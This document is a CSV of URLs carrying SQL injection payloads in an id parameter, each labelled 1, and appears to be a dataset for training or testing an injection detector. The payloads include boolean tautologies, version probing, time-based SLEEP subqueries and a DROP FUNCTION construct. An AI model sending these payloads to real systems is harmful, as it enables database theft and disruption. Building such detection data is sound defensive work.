URI,label
test.com/sqli/?id=1+OR+%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27pytW+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+890%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%271+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%27%271%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27%27pytW%27%27%27+LIKE+%27pytW%27&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW%27&Submit=Submit#,1
test.com/sqli/?id=OR+1000%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+1000%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+1%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27%27KtyB%27%27+LIKE+%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27%27&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+39%3D39+AND+%28%27kdcR%27+LIKE+kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+39%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D39+AND+%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+240%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+210%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+400%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+410%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+420%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+450%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+460%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+470%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+480%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+490%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+510%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+520%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+530%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+540%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+550%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+560%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+570%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D7400+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=AND+1%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+1%3D1%27+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+%27%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%%27%27%3D%27%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+55%3D55+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D%271%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D%271%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D%271+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+1%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+605%3D305+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+60%3D60+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+20%3D20+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+30%3D30+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+70%3D70+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+80%3D80+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+90%3D90+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+100%3D100+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+110%3D110+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+120%3D120+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0--%27%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D1--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%271%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%271%27%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D0--%27%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D1--%27&Submit=Submit#,1
test.com/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%27&Submit=Submit#,1
test.com/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%23%27&Submit=Submit#,1
test.com/sqli/?id=IF%287423%3D7424%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION+xclt&Submit=Submit#,1
test.com/sqli/?id=IF%287423%3D7423%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2823%3D23%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%284%3D4%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2870%3D70%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2850%3D50%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xctk--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcfk--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcsk--%27&Submit=Submit#,1
test.com/sqli/?id=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&Submit=Submit#,1
test.com/sqli/?id=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27M%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3D%27vRxe&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29YjoC%29+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%27&Submit=Submit#,1
test.com/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--%27&Submit=Submit#,1
test.com/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%28750%29%29%29ecMj%29--%27&Submit=Submit#,1
